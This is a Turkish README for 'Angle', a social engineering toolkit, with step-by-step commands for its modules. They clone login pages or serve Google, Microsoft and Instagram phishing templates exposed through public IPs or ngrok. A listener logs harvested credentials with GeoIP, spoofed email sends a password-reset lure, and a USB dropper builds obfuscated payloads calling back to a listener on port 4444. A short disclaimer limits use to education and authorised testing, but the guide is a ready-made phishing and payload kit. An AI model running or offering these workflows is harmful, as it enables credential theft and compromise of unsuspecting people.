# Angle — Modüler Sosyal Mühendislik Araç Seti

<div align="center">

```
 █████╗  ██╗   ██╗  ██████╗  ██╗      ███████╗
██╔══██╗ ████╗ ██║ ██╔════╝  ██║      ██╔════╝
███████║ ██╔██╗██║ ██║  ███╗ ██║      █████╗  
██╔══██║ ██║╚████║ ██║   ██║ ██║      ██╔══╝  
██║  ██║ ██║ ╚███║ ╚██████╔╝ ███████╗ ███████╗
╚═╝  ╚═╝ ╚═╝  ╚══╝  ╚═════╝  ╚══════╝ ╚══════╝
```

**v1.0.0** — *Geliştirici: Eren | Modüler, genişletilebilir, profesyonel*

[![English](https://img.shields.io/badge/Language-English-blue?style=flat-square)](README_EN.md)
![Python](https://img.shields.io/badge/python-3.9+-blue?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows%20|%20Linux%20|%20macOS-lightgrey?style=flat-square)

</div>

---

> **Yasal Uyarı:** Bu araç **yalnızca eğitim ve yetkili güvenlik testi amaçlıdır**. Yetkisiz kullanım yasaktır ve yasal sonuçlara yol açabilir. Kullanıcı tüm sorumluluğu üstlenir.

---

## Özellikler

| Özellik | Açıklama |
|---|---|
| **Oltalama (`oltalama`)** | Hedef web sayfalarını kopyalar veya dahili şablonları (Google, Microsoft, Instagram, Genel) kullanarak oltalama sunucusu oluşturur. Public IP, domain tünelleme, QR code ve offline asset dönüştürme desteği. |
| **Toplayıcı (`toplayici`)** | Bağımsız HTTP dinleyici — gelen POST isteklerindeki kimlik ve form verilerini GeoIP bilgisiyle birlikte kaydeder. |
| **E-posta (`eposta`)** | SMTP üzerinden sahte e-posta gönderimi. HTML, çoklu alıcı, dosya eki, yeniden deneme (retry) ve SSL/TLS desteği. |
| **USB Damlalık (`usb`)** | Windows, Linux ve macOS için USB tabanlı payload dosyaları oluşturur. Base64 obfuscation desteği. |
| **Kamuya Açık (Public WAN) IP** | Makinenin dış dünyadaki WAN IP adresini otomatik tespit eder ve bağlantı URL'lerini kamuya açık IP üzerinden yayınlar. |
| **Offline Proxying** | Kopyalanan sayfalardaki görseller indirilir ve base64 Data URI olarak HTML içerisine gömülür. Harici bağımlılık kalmaz. |
| **GeoIP İstihbaratı** | Yakalanan her kimlik bilgisine anlık IP bazlı Ülke, Şehir ve ISP bilgisi eklenir (LRU önbellekli). |
| **Canlı Dashboard** | Sunucu çalışırken canlı istatistik ve kontrol paneli sunar. Komutlar: `s` (istatistik), `l` (loglar), `r` (rapor), `q` (çıkış). |

---

## Kurulum

### Depoyu Klonlama ve Yükleme

```bash
git clone https://github.com/erensogutlu/angle.git
cd angle

# Bağımlılıkları yükleyin
pip install -r requirements.txt

# Veya geliştirici modunda yükleyin
pip install -e ".[dev]"
```

### Python Sürüm Uyumluluğu

| Python Sürümü | Durum |
|---|---|
| Python 3.9 | Desteklenir |
| Python 3.10 | Desteklenir |
| Python 3.11 | Desteklenir |
| Python 3.12+ | Desteklenir |

---

## Kullanım — Adım Adım Rehber

### 1. İnteraktif Menü Modu (Wizard)

**Ne yapar?** Herhangi bir CLI argümanı ezberlemenize gerek kalmadan, adım adım yönlendirmeli Rich arayüzü açar. Modüller otomatik keşfedilir.

**Komut:**
```bash
python angle.py
```

---

### 2. Oltalama Modu (Sayfa Kopyalama veya Dahili Şablon)

**Ne yapar?** Hedeflenen bir web sayfasını kopyalayarak veya dahili şablonları (Google, Microsoft, Instagram) başlatarak bir avlama sunucusu açar. Kamusal WAN IP'nizi ve tünel adresinizi otomatik işler.

**Senaryo A: URL'den Canlı Sayfa Kopyalama**
```bash
python angle.py oltalama --url https://example.com/login --port 8080
```

**Senaryo B: Dahili Hazır Şablon Kullanımı (Örn: Google)**
```bash
python angle.py oltalama --sablon google --port 8080
```

**Senaryo C: Dış Dünya Tüneli (Ngrok / Cloudflare) Kullanımı**
```bash
python angle.py oltalama --sablon google --port 8080 --dis-url https://ozel-subdomain.ngrok-free.app
```

**Sunucu Çalışırken Kullanılabilecek Komutlar:**
- `s` -> Canlı sunucu istatistik panelini gösterir.
- `l` -> Son yakalanan kimlik bilgilerini ve GeoIP lokasyon verilerini ekrana basar.
- `r` -> Toplanan verileri `rapor.html` ve JSON formatında rapora dönüştürür.
- `q` -> Sunucuyu ve dinleyiciyi güvenli bir şekilde kapatır.

---

### 3. Bağımsız Kimlik Bilgisi Toplayıcı Modu

**Ne yapar?** Herhangi bir HTML içeriği sunmadan, sadece gelen HTTP POST isteklerini ve form verilerini dinleyen hafif bir kayıt sunucusu başlatır.

```bash
python angle.py toplayici --port 9090
```

---

### 4. E-posta Gönderim Modu

**Ne yapar?** Belirtilen SMTP sunucusu üzerinden hedef adreslere HTML formatlı veya düz metin e-posta iletileri gönderir.

```bash
python angle.py eposta \
    --gonderen destek@sirket.com \
    --alici hedef@sirket.com \
    --konu "Acil: Şifre Sıfırlama" \
    --mesaj "Lütfen hesabınızı doğrulayın..." \
    --sunucu smtp.gmail.com \
    --port 587 \
    --kullanici test@gmail.com \
    --sifre "uygulama_sifresi" \
    --html
```

---

### 5. USB Damlalık Modu

**Ne yapar?** Hedef işletim sistemine (Windows, Linux, macOS) uygun USB tabanlı payload dosyaları oluşturur.

```bash
python angle.py usb --hedef /media/usb --ip 192.168.1.10 --port 4444 --os linux
```

---

## Hızlı Başlangıç — Örnek Test Senaryosu

```bash
# Adım 1: Depoyu indirin ve dizine girin
git clone https://github.com/erensogutlu/angle.git
cd angle

# Adım 2: Bağımlılıkları yükleyin
pip install -r requirements.txt

# Adım 3: Dahili Google şablonu ile oltalama sunucusu başlatın
python angle.py oltalama --sablon google --port 8080

# Adım 4: Başka bir terminalde veya tarayıcıda sunucuya erişim test edin
# Ekranda canlı verileri izleyin. Durdurmak için Ctrl+C veya 'q' tuşlayın.
```

---

## Tüm Parametreler (Referans Tablosu)

| Parametre | Kısa Hali | Modül | Zorunlu mu? | Açıklama |
|---|---|---|---|---|
| `--url` | - | `oltalama` | Hayır | Kopyalanacak hedef web sitesi adresi |
| `--sablon` | - | `oltalama` | Hayır | Dahili şablon adı (`google`, `microsoft`, `instagram`, `genel`) |
| `--port` | - | Hepsi | Hayır | Sunucunun dinleyeceği port (Varsayılan: 8080 / 9090) |
| `--dinle` | - | `oltalama`, `toplayici` | Hayır | Dinleme adresi (Varsayılan: 0.0.0.0) |
| `--dis-url` | - | `oltalama`, `toplayici` | Hayır | Kamuya açık dış tünel/domain adresi (ngrok vb.) |
| `--https` | - | `oltalama` | Hayır | Self-signed SSL sertifikası ile HTTPS aktif et |
| `--gonderen` | - | `eposta` | Evet | Gönderen e-posta adresi |
| `--alici` | - | `eposta` | Evet | Alıcı e-posta adresi |
| `--konu` | - | `eposta` | Evet | E-posta konu başlığı |
| `--mesaj` | - | `eposta` | Evet | E-posta gövde metni |
| `--sunucu` | - | `eposta` | Evet | SMTP sunucu adresi (`smtp.gmail.com` vb.) |
| `--kullanici` | - | `eposta` | Evet | SMTP kullanıcı adı |
| `--sifre` | - | `eposta` | Evet | SMTP şifresi / uygulama şifresi |
| `--html` | - | `eposta` | Hayır | E-postayı HTML formatında gönder |
| `--ek` | - | `eposta` | Hayır | E-postaya eklenecek dosya yolu |
| `--hedef` | - | `usb` | Evet | USB sürücüsünün bağlama noktası / hedef dizin |
| `--ip` | - | `usb` | Evet | Bağlantı kabul edecek dinleyici IP adresi |
| `--os` | - | `usb` | Evet | Hedef işletim sistemi (`windows`, `linux`, `macos`) |
| `--version` | `-V` | Genel | Hayır | Araç versiyon bilgisini gösterir |
| `--help` | `-h` | Genel | Hayır | Komut yardım menüsünü gösterir |

---

## Yapılandırma

Yapılandırma değişkenleri 4 katmanlı öncelik sırasına göre işlenir:

1. **CLI Argümanları** (En yüksek öncelik)
2. **Ortam Değişkenleri** (`ANGLE_PORT`, `ANGLE_LOG_LEVEL`, `ANGLE_HTTPS`)
3. **Ayar Dosyası** (`angle_modulleri/ayarlar.json`)
4. **Varsayılan Değerler** (`Yapilandirma` dataclass)

```bash
# Örnek ortam değişkeni tanımlama
export ANGLE_PORT=9090
export ANGLE_LOG_LEVEL=DEBUG
export ANGLE_HTTPS=true
```

---

## Mimari Yapı

```
angle/
├── angle.py                  # CLI ve interaktif wizard giriş noktası
├── pyproject.toml             # PEP 621 proje yapılandırması
├── requirements.txt           # Bağımlılıklar
├── angle_modulleri/
│   ├── __init__.py            # Otomatik eklenti keşif sistemi
│   ├── konsol.py              # Rich tabanlı konsol çıktı altyapısı
│   ├── yardimci.py            # Konfigürasyon, GeoIP, Public IP, SSL yardımcıları
│   ├── sunucu.py              # Thread-safe, rate-limited gelişmiş HTTP sunucusu
│   ├── oltalama.py            # Oltalama ve web kopyalama modülü
│   ├── toplayici.py           # Kimlik bilgisi toplayıcı
│   ├── eposta_sahte.py        # E-posta gönderme modülü
│   ├── usb_damlat.py          # USB damlalık oluşturucu
│   └── sablonlar/             # Dahili HTML şablonları
└── testler/                   # Birim test dizini (53 test)
```

---

## Güvenlik ve Stabilite Özellikleri

- **Thread-Safe Dosya Yazma:** Eşzamanlı isteklerde veri bütünlüğü koruması.
- **Path Traversal Koruması:** `../` dizin tırmanma saldırılarına karşı statik dosya doğrulaması.
- **Rate Limiting:** IP başına dakikadaki istek sınırlaması.
- **Offline Proxying:** Kopyalanan sayfalardaki görsellerin base64'e dönüştürülmesiyle harici bağımlılıksız çalışma.
- **Graceful Shutdown:** Ctrl+C veya `q` komutu ile temiz kapanış ve veri raporlaması.

---

## Sık Sorulan Sorular (SSS)

**S: Kopyalanan web sitesindeki resimler görünmüyor, ne yapmalıyım?**
Angle, kopyalanan web sitelerindeki resim ve varlıkları otomatik olarak indirip base64 formatına çevirir (Offline Proxy). İnternet bağlantınız aktifken kopyalama yaptıysanız resimler çevrimdışı dahi sorunsuz yüklenir.

**S: Dış dünyadan (internet üzerinden) erişim nasıl sağlanır?**
Araç otomatik olarak kamusal WAN IP adresinizi tespit eder. Ayrıca `--dis-url` parametresi ile `ngrok` veya `cloudflare tunnel` adresinizi belirterek hedef kişilerin internet üzerinden erişmesini sağlayabilirsiniz.

**S: Port çakışması hatası alıyorum?**
Farklı bir port kullanmak için `--port 8081` gibi boş bir port numarası belirtebilirsiniz.

---

## Eklenti Sistemi

Yeni modül eklemek için `angle_modulleri/` dizinine `.py` dosyası oluşturun ve `MODUL_BILGI` sözlüğü tanımlayın:

```python
# angle_modulleri/yeni_modul.py

MODUL_BILGI = {
    "ad": "Yeni Modül",
    "aciklama": "modül açıklaması",
    "giris_noktasi": "baslat",  # çağrılacak fonksiyon adı
    "komut": "yenimodul",       # CLI alt komutu
}

def baslat():
    """modül giriş noktası"""
    print("yeni modül çalışıyor!")
```

---

## Lisans

MIT License — Detaylar için [LICENSE](LICENSE) dosyasına bakınız.

---

**Geliştirici:** Eren  
**Sürüm:** 1.0.0  
**Platform:** Windows / Linux / macOS
